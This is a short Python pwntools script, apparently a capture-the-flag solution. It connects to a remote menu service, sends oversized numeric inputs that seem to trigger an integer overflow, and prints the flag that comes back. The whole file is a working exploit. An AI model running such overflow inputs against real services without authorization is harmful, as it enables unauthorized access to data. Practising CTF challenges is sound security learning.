#!/usr/bin/env python3

from pwn import *
import sys

def exploit(io):
    io.sendline(b"1")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"0")
    io.sendlineafter(b"n1: ", b"9999999999999999")
    io.sendlineafter(b"n2: ", b"9999999999999999")
    flag = io.recv().decode()
    print(flag)

def main():
    HOST, PORT = sys.argv[1].split(":")
    io = remote(HOST, PORT)
    exploit(io)



if __name__ == "__main__":
    main()
